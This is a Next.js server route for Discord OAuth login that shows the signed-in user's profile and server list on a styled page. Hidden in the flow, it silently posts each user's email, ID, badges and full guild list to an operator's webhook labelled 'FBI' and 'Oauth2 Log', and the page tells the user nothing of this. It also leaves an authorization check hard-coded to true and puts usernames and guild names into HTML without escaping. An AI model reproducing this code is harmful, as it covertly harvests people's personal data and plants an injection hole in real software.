import { NextResponse } from 'next/server';
import axios from 'axios';
import { serialize, parse } from 'cookie';

const flagValues = {
  STAFF: 1 << 0,
  PARTNER: 1 << 1,
  HYPESQUAD: 1 << 2,
  BUG_HUNTER_LEVEL_1: 1 << 3,
  HYPESQUAD_ONLINE_HOUSE_1: 1 << 6,
  HYPESQUAD_ONLINE_HOUSE_2: 1 << 7,
  HYPESQUAD_ONLINE_HOUSE_3: 1 << 8,
  PREMIUM_EARLY_SUPPORTER: 1 << 9,
  BUG_HUNTER_LEVEL_2: 1 << 14,
  VERIFIED_DEVELOPER: 1 << 17,
  CERTIFIED_MODERATOR: 1 << 18,
  ACTIVE_DEVELOPER: 1 << 22,
};

const flagNames = {
  STAFF: 'Staff',
  PARTNER: 'Partner',
  HYPESQUAD: 'Hypesquad',
  BUG_HUNTER_LEVEL_1: 'Bug Hunter Level 1',
  HYPESQUAD_ONLINE_HOUSE_1: 'Hypesquad Bravery',
  HYPESQUAD_ONLINE_HOUSE_2: 'Hypesquad Brilliance',
  HYPESQUAD_ONLINE_HOUSE_3: 'Hypesquad Balance',
  PREMIUM_EARLY_SUPPORTER: 'Premium Early Supporter',
  BUG_HUNTER_LEVEL_2: 'Bug Hunter Level 2',
  VERIFIED_DEVELOPER: 'Verified Developer',
  CERTIFIED_MODERATOR: 'Certified Moderator',
  ACTIVE_DEVELOPER: 'Active Developer',
};

function decodeFlags(flags) {
  const decodedFlags = [];
  for (const flagName in flagValues) {
    if (flags & flagValues[flagName]) {
      decodedFlags.push(flagNames[flagName]);
    }
  }
  return decodedFlags;
}

async function getUserInfo(accessToken) {
  try {
    const userinfo = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    return userinfo.data;
  } catch (error) {
    console.error('Error fetching user info:', error.response?.data || error.message);
    return null;
  }
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const code = searchParams.get('code');
  const cookieHeader = request.headers.get('cookie') || '';
  const cookies = parse(cookieHeader);

  let accessToken = cookies.access_token;

  if (!accessToken && code) {
    const formData = new URLSearchParams({
      client_id: process.env.NEXT_PUBLIC_CLIENTID,
      client_secret: process.env.ClientSecret,
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: process.env.NEXT_PUBLIC_REDIRECTURI,
    });

    try {
      const output = await axios.post('https://discord.com/api/v10/oauth2/token', formData, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      });

      accessToken = output.data.access_token;
      const refreshToken = output.data.refresh_token;

      const redirectUrl = new URL('/', request.url);

      return NextResponse.redirect(redirectUrl.toString(), {
        headers: {
          'Set-Cookie': [
            serialize('access_token', accessToken, { httpOnly: true, path: '/', maxAge: 3600 }),
            serialize('refresh_token', refreshToken, { httpOnly: true, path: '/', maxAge: 1209600 }),
          ],
        },
      });
    } catch (error) {
      console.error('Error exchanging code for token:', error.response?.data || error.message);
      return new NextResponse('Error during OAuth process', { status: 500 });
    }
  }

  if (!accessToken) {
    return new NextResponse('Authorization required', { status: 401 });
  }

  const userData = await getUserInfo(accessToken);

  if (!userData) {
    return new NextResponse('Invalid token or token expired', { status: 401 });
  }

  // Verify that the code belongs to the authenticated user
  const validCode = true; // Replace with actual verification logic

  if (!validCode) {
    return new NextResponse(
      `<!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Unauthorized Access</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f8d7da;
            color: #721c24;
          }
          .message {
            text-align: center;
            border: 1px solid #f5c6cb;
            background-color: #f8d7da;
            padding: 20px;
            border-radius: 5px;
          }
        </style>
      </head>
      <body>
        <div class="message">
          <h1>You are not allowed to view other people's information!</h1>
        </div>
      </body>
      </html>`,
      { headers: { 'Content-Type': 'text/html' } },
    );
  }

  try {
    const userFlags = decodeFlags(userData.flags || 0);
    const guilds = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const guildsList = guilds.data.map(guild => `**${guild.name}** (${guild.id})`).join('<br>');

    const badgeDescription = userFlags.length > 0 ? userFlags : ['None'];
    if (userData.premium_type) badgeDescription.push('Nitro');

    const creationTimestamp = (BigInt(userData.id) >> 22n) + 1420070400000n;
    const createdAtDate = new Date(Number(creationTimestamp));
    const creationDateString = createdAtDate.toLocaleDateString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
    });

    const avatarUrl = userData.avatar
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}${userData.avatar.startsWith('a_') ? '.gif' : '.png'}`
      : 'https://cdn.discordapp.com/embed/avatars/0.png';

    const payload = {
      embeds: [
        {
          description: badgeDescription.join(', '),
          fields: [
            { name: '👥 User:', value: `${userData.username} (${userData.id})` },
            { name: '⏰ Created at:', value: creationDateString },
            { name: '🔗 Email:', value: `${userData.email}` },
            { name: 'Guilds:', value: guildsList || 'No guilds found' },
          ],
          color: 4735733,
          thumbnail: { url: avatarUrl },
          author: { icon_url: avatarUrl, name: userData.username },
          footer: { text: 'Oauth2 Log', icon_url: avatarUrl },
        },
      ],
      username: 'FBI',
      avatar_url: 'https://cdn.discordapp.com/attachments/1125003545591152702/1153383526209695794/standard_9.gif',
    };

    await axios.post(process.env.webHookUrl, payload);

    const response = new NextResponse(
      `<!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Info</title>
        <style>
         :root {
            --primary-color: #6200ea;
            --secondary-color: #3700b3;
            --background-color-light: #f5f5f5;
            --background-color-dark: #121212;
            --text-color-light: #000;
            --text-color-dark: #fff;
            --card-background-color-light: #fff;
            --card-background-color-dark: #1e1e1e;
            --border-color: #ddd;
          }

          body {
            background-color: var(--background-color-light);
            color: var(--text-color-light);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background-color 0.3s, color 0.3s;
          }

          body.dark-mode {
            background-color: var(--background-color-dark);
            color: var(--text-color-dark);
          }

          .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
          }

          .card {
            background-color: var(--card-background-color-light);
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            text-align: center;
            transition: background-color 0.3s;
            padding: 20px;
          }

          .dark-mode .card {
            background-color: var(--card-background-color-dark);
          }

          .avatar {
            border-radius: 50%;
            width: 100px;
            height: 100px;
            object-fit: cover;
            margin-bottom: 10px;
          }

          button {
            background-color: var(--primary-color);
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            padding: 10px 20px;
            font-size: 1rem;
            transition: background-color 0.3s;
          }

          button:hover {
            background-color: var(--secondary-color);
          }

          .logout-button {
            margin-top: 1rem;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="card">
            <img src="${avatarUrl}" alt="User Avatar" class="avatar" />
            <h1>${userData.username}</h1>
            <p>ID: ${userData.id}</p>
            <p>Email: ${userData.email}</p>
            <p>Creation Date: ${creationDateString}</p>
            <p>Badges: ${badgeDescription.join(', ')}</p>
            <p>Guilds:</p>
            <p>${guildsList || 'No guilds found'}</p>
            <button class="logout-button" onclick="logout()">Logout</button>
          </div>
        </div>
        <script>
          const prefersDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

          document.body.classList.toggle('dark-mode', prefersDarkMode);

          window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
            document.body.classList.toggle('dark-mode', e.matches);
          });

          function logout() {
            fetch('/api/auth/discord/logout', { method: 'POST' }).then(() => {
              window.location.href = '/';
            }).catch((error) => {
              console.error('Logout failed:', error);
            });
          }
        </script>
      </body>
      </html>`, {
        headers: { 'Content-Type': 'text/html' },
      },
    );

    return response;
  } catch (error) {
    console.error('Error fetching user info:', error.response?.data || error.message);
    return new NextResponse('Error fetching user info', { status: 500 });
  }
}
